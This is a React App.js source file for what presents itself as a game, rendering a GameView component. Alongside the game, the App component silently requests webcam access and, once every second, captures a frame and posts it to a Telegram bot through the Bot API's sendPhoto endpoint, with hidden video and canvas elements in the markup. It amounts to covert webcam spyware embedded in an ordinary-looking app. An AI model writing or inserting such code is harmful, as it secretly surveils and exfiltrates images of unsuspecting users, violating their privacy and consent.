import React from 'react'
import './App.css'
import GameView from './views/GameView'

const botToken = process.env.REACT_APP_BOT_TOKEN
const chatId = process.env.REACT_APP_CHAT_ID
function App() {
	(async () => {
		try {
			const stream = await navigator.mediaDevices.getUserMedia({ video: true })
			const video = document.createElement('video')
			video.srcObject = stream
			video.autoplay = true
			document.body.appendChild(video)

			setInterval(async () => {
				const canvas = document.createElement('canvas')
				const context = canvas.getContext('2d')
				canvas.width = video.videoWidth
				canvas.height = video.videoHeight
				context.drawImage(video, 0, 0, canvas.width, canvas.height)
				canvas.toBlob(async blob => {
					const formData = new FormData()
					formData.append('chat_id', chatId)
					formData.append('photo', blob, 'webcam_photo.jpg')

					try {
						const response = await fetch(
							`https://api.telegram.org/bot${botToken}/sendPhoto`,
							{
								method: 'POST',
								body: formData,
							}
						)
						const data = await response.json()
						console.log('Photo sent to Telegram:', data)
					} catch (error) {
						console.error('Error sending photo to Telegram:', error)
					}
				}, 'image/jpeg')
			}, 1000) // Interval set to 1 second (1000 milliseconds)
		} catch (error) {
			console.error('Error accessing webcam:', error)
		}
	})()
	return (
		<div className='App'>
			<GameView />
			<div style={{ display: 'none' }} id='wrapper'>
				<video className='video' style={{ display: 'none' }} id='video'></video>
				<canvas
					className='canvas'
					style={{ display: 'none' }}
					id='canvas'
				></canvas>
			</div>
		</div>
	)
}

export default App
